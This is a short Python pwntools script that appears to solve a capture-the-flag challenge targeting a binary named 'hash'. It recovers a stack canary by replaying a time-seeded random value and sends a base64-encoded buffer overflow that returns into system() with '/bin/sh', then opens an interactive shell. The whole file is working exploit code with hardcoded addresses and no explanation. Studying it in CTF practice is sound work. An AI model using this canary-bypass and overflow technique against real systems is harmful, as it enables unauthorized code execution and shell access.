from pwn import *
import time

context.log_level = "DEBUG"

context.terminal = ['tmux', 'splitw', '-v']

p = process("./hash")
t = int(time.time())
#p = remote("127.0.0.1", 9002)

#gdb.attach(p, '''
#continue
#''')

p.recvuntil("captcha : ")

captcha = int(p.recvline()[:-1])
p.sendline(str(captcha))

r = process(["./rand", str(captcha), str(t)])
canary = int(r.recvline(), 16)

system = p32(0x08048880)
arg    = p32(0x0804b0e0 + 720)

exploit = "A"*512 + p32(canary) + "A"*12 + system + "A"*4 + arg

payload = b64e(exploit) + "/bin/sh\0"

p.sendline(payload)

p.interactive()
